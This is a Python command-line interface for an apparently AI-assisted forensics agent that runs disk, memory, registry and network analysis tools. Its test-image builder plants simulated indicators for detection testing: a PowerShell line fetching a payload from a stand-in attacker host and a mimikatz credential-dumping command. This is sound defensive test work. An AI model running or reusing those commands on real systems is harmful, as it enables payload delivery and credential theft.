"""
findevil-cli: Complete command-line interface for the FindEvil DFIR Agent.

Usage:
  # Run full automated investigation
  python -m src.cli investigate /evidence/cases/image.raw --output /results/case1

  # Start MCP server only (for integration with Claude Code, etc.)
  python -m src.cli serve

  # Run a single tool against evidence
  python -m src.cli tool fs_list_files --image /evidence/cases/image.raw

  # List available tools
  python -m src.cli tools

  # Generate a test image
  python -m src.cli create-test-image /evidence/cases/test.raw

  # Get help
  python -m src.cli --help
"""
import argparse
import asyncio
import json
import logging
import os
import sys
import time
from datetime import datetime, timezone
from pathlib import Path

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
)
logger = logging.getLogger("findevil-cli")


def _s(s: str, n: int = 500) -> str:
    """Sanitize and truncate a string for safe logging."""
    if not s:
        return ""
    safe = "".join(c for c in s if c.isprintable() or c in "\n\r\t")
    return safe[:n] + "..." if len(safe) > n else safe


def main():
    """Main CLI entry point."""
    parser = argparse.ArgumentParser(
        prog="findevil",
        description="FindEvil — Autonomous DFIR Analysis Agent",
        epilog="Powered by Groq AI + SIFT Workstation + Custom MCP Server",
    )
    parser.add_argument("--version", action="version", version="FindEvil Agent v2.0.0")
    parser.add_argument("--groq-key", help="Groq API key (or set GROQ_API_KEY env var)")
    parser.add_argument("--evidence-root", default="/evidence", help="Evidence root directory")
    parser.add_argument("--results-root", default="/results", help="Results root directory")
    parser.add_argument("--debug", action="store_true", help="Enable debug logging")

    subparsers = parser.add_subparsers(dest="command", help="Available commands")

    # ── investigate ──
    inv = subparsers.add_parser("investigate", help="Run full automated DFIR investigation")
    inv.add_argument("evidence", help="Path to evidence file (disk image, memory dump, pcap)")
    inv.add_argument("--task", default="Investigate this evidence for signs of compromise. Find all artifacts and indicators of compromise.",
                     help="Natural language task description")
    inv.add_argument("--output", default=None, help="Output directory for results")
    inv.add_argument("--groq-model", default="llama-3.3-70b-versatile", help="Groq model for AI analysis")
    inv.add_argument("--no-ai", action="store_true", help="Skip AI report generation (tool results only)")
    inv.add_argument("--phase", default=None, choices=["triage", "filesystem", "artifacts", "memory", "registry", "network", "all"],
                     help="Run only a specific phase")
    inv.add_argument("--json", action="store_true", help="Output results as JSON (default: human-readable)")

    # ── serve ──
    subparsers.add_parser("serve", help="Start MCP server for integration with Claude Code etc.")

    # ── tools ──
    subparsers.add_parser("tools", help="List all available forensic tools")

    # ── tool ──
    single = subparsers.add_parser("tool", help="Run a single forensic tool")
    single.add_argument("tool_name", help="Name of the tool to run")
    single.add_argument("--image", help="Path to evidence image")
    single.add_argument("--inode", type=int, default=0, help="Inode number")
    single.add_argument("--offset", type=int, default=0, help="Partition offset")
    single.add_argument("--output", help="Output directory (for carve/extract)")
    single.add_argument("--algorithm", default="sha256", help="Hash algorithm")
    single.add_argument("--rules", help="YARA rules file or inline content")
    single.add_argument("--key", help="Registry key path")
    single.add_argument("--filter", help="Display filter for pcap")
    single.add_argument("--json", action="store_true", help="Output as JSON")

    # ── create-test-image ──
    cti = subparsers.add_parser("create-test-image", help="Create a forensic test image with known artifacts")
    cti.add_argument("output", help="Output path for test image")
    cti.add_argument("--size", type=int, default=50, help="Size in MB (default: 50)")

    # ── check ──
    subparsers.add_parser("check", help="Check environment: verify all tools are available")

    args = parser.parse_args()

    if args.debug:
        logging.getLogger().setLevel(logging.DEBUG)

    # Set environment
    os.environ["EVIDENCE_ROOT"] = args.evidence_root
    os.environ["RESULTS_ROOT"] = args.results_root
    if args.groq_key:
        os.environ["GROQ_API_KEY"] = args.groq_key

    # Route to handler
    if args.command == "investigate":
        asyncio.run(_cmd_investigate(args))
    elif args.command == "serve":
        asyncio.run(_cmd_serve())
    elif args.command == "tools":
        asyncio.run(_cmd_tools())
    elif args.command == "tool":
        asyncio.run(_cmd_tool(args))
    elif args.command == "create-test-image":
        _cmd_create_test_image(args)
    elif args.command == "check":
        asyncio.run(_cmd_check())
    else:
        parser.print_help()
        sys.exit(1)


async def _cmd_investigate(args):
    """Run full automated investigation."""
    evidence_path = args.evidence
    output_dir = args.output or f"/results/investigation_{datetime.now().strftime('%Y%m%d_%H%M%S')}"

    if not Path(evidence_path).exists():
        logger.error(f"Evidence not found: {_s(evidence_path)}")
        sys.exit(1)

    os.environ["RESULTS_ROOT"] = output_dir
    Path(output_dir).mkdir(parents=True, exist_ok=True)

    logger.info(f"╔{'═' * 58}╗")
    logger.info(f"║  FindEvil — DFIR Investigation")
    logger.info(f"║  Evidence: {_s(evidence_path, 80)}")
    logger.info(f"║  Output:   {_s(output_dir, 80)}")
    logger.info(f"╚{'═' * 58}╝")

    from src.agent.loop import SimpleMCPClient, DFIRWorkflow, ToolCall
    from src.agent.groq_client import GroqDFIRClient

    # Start MCP server
    client = SimpleMCPClient()
    try:
        await client.start()
        logger.info("✅ MCP server connected")

        # Initialize Groq if key available
        groq_key = os.environ.get("GROQ_API_KEY", args.groq_key or "")
        groq = None
        if groq_key and not args.no_ai:
            try:
                groq = GroqDFIRClient(api_key=groq_key, model=args.groq_model)
                logger.info(f"✅ Groq AI initialized ({groq.model})")
            except Exception as e:
                logger.warning(f"⚠️ Groq init failed: {e}")

        workflow = DFIRWorkflow(client, groq_client=groq)
        workflow._evidence_path = evidence_path

        # Determine which phases to run
        phase_map = {
            "triage": "initial_triage",
            "filesystem": "filesystem_analysis",
            "artifacts": "artifact_extraction",
            "memory": "memory_analysis",
            "registry": "registry_analysis",
            "network": "network_analysis",
        }
        if args.phase and args.phase != "all":
            mapped = phase_map.get(args.phase, args.phase)
            phases_to_run = [mapped]
        else:
            phases_to_run = ["initial_triage", "filesystem_analysis", "artifact_extraction",
                             "memory_analysis", "registry_analysis", "network_analysis"]

        phase_tools = {
            "initial_triage": ["list_evidence", "verify_hash", "fs_filesystem_info"],
            "filesystem_analysis": ["fs_list_files", "fs_file_metadata", "fs_extract_file"],
            "artifact_extraction": ["carve_files", "scan_yara"],
            "memory_analysis": ["mem_list_processes", "mem_analyze", "mem_scan_network", "mem_dump_cmdline"],
            "registry_analysis": ["reg_analyze_hive"],
            "network_analysis": ["pcap_analyze", "pcap_list_protocols"],
        }

        all_findings = []
        all_tool_calls = []

        for phase in phases_to_run:
            if phase not in phase_tools:
                logger.warning(f"Unknown phase: {phase}")
                continue

            logger.info(f"── Phase: {phase} ──")
            for tool in phase_tools[phase]:
                workflow.state.iteration += 1
                tc = ToolCall(tool, workflow._build_args(tool), workflow.state.iteration)

                try:
                    result = await client.call_tool(tool, tc.arguments)
                    parsed = json.loads(result) if isinstance(result, str) else result
                    tc.success = parsed.get("success", False)
                    tc.duration_ms = parsed.get("duration_ms", 0)
                    tc.result = parsed

                    if tc.success:
                        workflow._extract_findings(tool, parsed)
                        logger.info(f"  ✅ {tool} ({tc.duration_ms}ms)")
                    else:
                        logger.warning(f"  ⚠️ {tool}: {parsed.get('error', 'unknown')[:100]}")
                except Exception as e:
                    tc.error = str(e)
                    logger.warning(f"  ❌ {tool}: {e}")

                workflow.state.record_call(tc)
                all_tool_calls.append(tc.to_dict())

        all_findings = workflow.state.findings

        # Generate AI report if Groq is available
        report = None
        if groq and all_findings:
            logger.info("── Generating AI Report ──")
            try:
                findings_for_report = [f for f in all_findings if f.get("type") != "case_info"]
                report_text = groq.generate_report(
                    findings_for_report,
                    [t.to_dict() for t in workflow.state.tool_calls],
                )
                try:
                    report = json.loads(report_text)
                except json.JSONDecodeError:
                    report = {"raw_report": report_text}
                logger.info("  ✅ AI report generated")
            except Exception as e:
                logger.warning(f"  ⚠️ AI report failed: {e}")

        # Build final results
        results = {
            "success": True,
            "evidence": evidence_path,
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "summary": workflow.state.get_summary(),
            "findings": all_findings,
            "tool_calls": all_tool_calls,
            "report": report or workflow._generate_narrative(),
        }

        # Save results
        results_path = Path(output_dir) / "investigation_result.json"
        with open(results_path, "w") as f:
            json.dump(results, f, indent=2)
        logger.info(f"📄 Results saved to: {results_path}")

        # Print summary
        if args.json:
            print(json.dumps(results, indent=2))
        else:
            s = results["summary"]
            print(f"\n{'=' * 60}")
            print(f"INVESTIGATION COMPLETE")
            print(f"{'=' * 60}")
            print(f"  Tool calls: {s['tool_calls']} ({s['successful_calls']} OK, {s['failed_calls']} failed)")
            print(f"  Findings:   {s['findings']}")
            print(f"  Duration:   {s['elapsed_seconds']}s")
            print(f"  Output:     {output_dir}")
            if report:
                if isinstance(report, dict) and "summary" in report:
                    print(f"\n  AI Summary: {report['summary'][:200]}...")
            print(f"{'=' * 60}")

    except Exception as e:
        logger.error(f"Investigation failed: {e}")
        raise
    finally:
        await client.stop()


async def _cmd_serve():
    """Start MCP server."""
    from src.server import main as server_main
    logger.info("Starting MCP server in serve mode...")
    await server_main()


async def _cmd_tools():
    """List all available tools."""
    from src.agent.loop import SimpleMCPClient

    client = SimpleMCPClient()
    try:
        await client.start()
        tools = await client.list_tools()
        print(f"\n📋 FindEvil — 21 Forensic Tools\n")
        for t in tools:
            print(f"  🔧 {t['name']}")
            print(f"     {t.get('description', '')[:90]}")
            print()
    finally:
        await client.stop()


async def _cmd_tool(args):
    """Run a single forensic tool."""
    from src.agent.loop import SimpleMCPClient

    tool_name = args.tool_name
    arguments = {}

    # Map common args to tool parameters
    if args.image:
        arguments["image_path"] = args.image
    if args.inode:
        arguments["inode"] = args.inode
    if args.offset:
        arguments["offset"] = args.offset
    if args.output:
        arguments["output_dir"] = args.output
    if args.algorithm:
        arguments["algorithm"] = args.algorithm
    if args.rules:
        arguments["rules"] = args.rules
    if args.key:
        arguments["key"] = args.key
    if args.filter:
        arguments["display_filter"] = args.filter

    # For memory tools, use memory_path
    if tool_name.startswith("mem_"):
        if args.image:
            arguments["memory_path"] = args.image

    # For pcap tools, use pcap_path
    if tool_name.startswith("pcap_"):
        if args.image:
            arguments["pcap_path"] = args.image

    # For registry tools
    if tool_name == "reg_analyze_hive":
        if args.image:
            arguments["hive_path"] = args.image

    # For hash tool
    if tool_name == "verify_hash":
        if args.image:
            arguments["file_path"] = args.image

    # For yara
    if tool_name == "scan_yara":
        if args.image:
            arguments["target"] = args.image

    client = SimpleMCPClient()
    try:
        await client.start()
        result = await client.call_tool(tool_name, arguments)

        if isinstance(result, str):
            parsed = json.loads(result)
        else:
            parsed = result

        if args.json:
            print(json.dumps(parsed, indent=2))
        else:
            success = parsed.get("success", False)
            status = "✅" if success else "❌"
            print(f"\n{status} {tool_name}")
            print(f"  Success: {success}")
            if parsed.get("error"):
                print(f"  Error:   {parsed['error']}")
            if parsed.get("match_count") is not None:
                print(f"  Matches: {parsed['match_count']}")
            if parsed.get("file_count") is not None:
                print(f"  Files:   {parsed['file_count']}")
            if parsed.get("hash"):
                print(f"  Hash:    {parsed['hash']}")
            if parsed.get("partitions"):
                print(f"  Partitions: {len(parsed['partitions'])}")
            if parsed.get("packet_count") is not None:
                print(f"  Packets: {parsed['packet_count']}")
            if parsed.get("duration_ms"):
                print(f"  Time:    {parsed['duration_ms']}ms")

    finally:
        await client.stop()


def _cmd_create_test_image(args):
    """Create a forensic test image with known artifacts."""
    output = args.output
    size_mb = args.size

    print(f"Creating test image: {output} ({size_mb}MB)")

    import subprocess as sp

    # Create empty image
    sp.run(["dd", "if=/dev/zero", f"of={output}", "bs=1M", f"count={size_mb}"],
           capture_output=True)

    # Format as ext2
    result = sp.run(["mkfs.ext2", "-F", output], capture_output=True, text=True)
    if result.returncode != 0:
        logger.error(f"Failed to format: {result.stderr}")
        sys.exit(1)

    # Create known indicator files using debugfs
    commands = [
        "mkdir /Users",
        "mkdir /Users/Admin",
        "mkdir /Users/Admin/Downloads",
        "mkdir /Documents",
        "mkdir /Windows",
        "mkdir /Windows/System32",
        "mkdir /Windows/System32/config",
    ]

    for cmd in commands:
        sp.run(["debugfs", "-w", "-R", cmd, output], capture_output=True)

    # Create files
    echo_cmds = [
        ("write /dev/stdin /hello.txt",
         "Hello from Find Evil! Test file for DFIR analysis.\n"
         "Suspicious activity at 2026-06-01 03:14:15 UTC\n"
         "Malicious payload: C:\\Windows\\malware.exe\n"
         "Registry key: HKLM\\SYSTEM\\CurrentControlSet\\Services\\malware\n"
         "Network: 192.168.1.100:4444\n"),
        ("write /dev/stdin /Users/Admin/Downloads/evil.ps1",
         "# PowerShell payload\nInvoke-WebRequest -Uri http://malware.evil.com/payload\n"),
        ("write /dev/stdin /Users/Admin/Downloads/mimikatz_log.txt",
         "mimikatz: sekurlsa::logonpasswords\nAdmin:CORP:aad3b435b51404ee\n"),
        ("write /dev/stdin /Windows/System32/config/SAM",
         b"This is a SAM registry hive (simulated)\n".decode()),
    ]

    for wr_cmd, content in echo_cmds:
        sp.run(["debugfs", "-w", "-R", f"{wr_cmd}", output],
               input=content, capture_output=True, text=True)

    print(f"✅ Test image created: {output} ({size_mb}MB)")
    print(f"   Contains: hello.txt (indicators), evil.ps1 (malicious script),")
    print(f"   mimikatz_log.txt, simulated registry hives")


async def _cmd_check():
    """Check environment for all required tools."""
    import shutil

    print(f"\n🔍 FindEvil — Environment Check\n")

    required_tools = {
        "fls": "The Sleuth Kit (TSK) - file listing",
        "icat": "The Sleuth Kit (TSK) - file extraction",
        "mmls": "The Sleuth Kit (TSK) - partition scanning",
        "fsstat": "The Sleuth Kit (TSK) - filesystem stats",
        "istat": "The Sleuth Kit (TSK) - inode metadata",
        "foremost": "File carving utility",
        "yara": "Pattern matching engine",
        "tshark": "Wireshark CLI - packet analysis",
        "sha256sum": "SHA256 hashing (coreutils)",
        "sha1sum": "SHA1 hashing (coreutils)",
        "md5sum": "MD5 hashing (coreutils)",
        "strings": "String extraction (binutils)",
        "debugfs": "ext2/3/4 debug filesystem",
    }

    python_modules = {
        "fastmcp": "MCP Server framework",
        "pydantic": "Data validation",
        "groq": "Groq AI API client",
        "volatility3": "Memory forensics framework",
        "regipy": "Windows Registry parser",
    }

    all_ok = True

    print("── System Tools ──")
    for tool, desc in required_tools.items():
        path = shutil.which(tool)
        if path:
            print(f"  ✅ {tool:15s} found at {path}")
        else:
            print(f"  ❌ {tool:15s} NOT FOUND — {desc}")
            all_ok = False

    print("\n── Python Modules ──")
    for mod, desc in python_modules.items():
        try:
            __import__(mod)
            ver = getattr(__import__(mod), "__version__", "?")
            print(f"  ✅ {mod:15s} installed ({ver})")
        except ImportError:
            print(f"  ❌ {mod:15s} NOT INSTALLED — {desc}")
            all_ok = False

    # Check evidence directories
    print("\n── Evidence Directories ──")
    ev_root = Path(os.environ.get("EVIDENCE_ROOT", "/evidence"))
    res_root = Path(os.environ.get("RESULTS_ROOT", "/results"))
    for d in [ev_root, res_root]:
        if d.exists():
            print(f"  ✅ {str(d):15s} exists")
        else:
            print(f"  ⚠️ {str(d):15s} does not exist (will be created)")

    print("\n── Groq API Key ──")
    groq_key = os.environ.get("GROQ_API_KEY", "")
    if groq_key:
        print(f"  ✅ GROQ_API_KEY set ({groq_key[:20]}...)")
    else:
        print(f"  ⚠️ GROQ_API_KEY not set — AI features disabled")
        print(f"     Get a key: https://console.groq.com")

    print(f"\n{'=' * 50}")
    if all_ok:
        print(f"✅ All systems ready for DFIR analysis!")
    else:
        print(f"⚠️  Some tools missing. Install SIFT Workstation for full functionality.")
        print(f"   docker pull sansdfir/sift")
    print(f"{'=' * 50}\n")


if __name__ == "__main__":
    main()
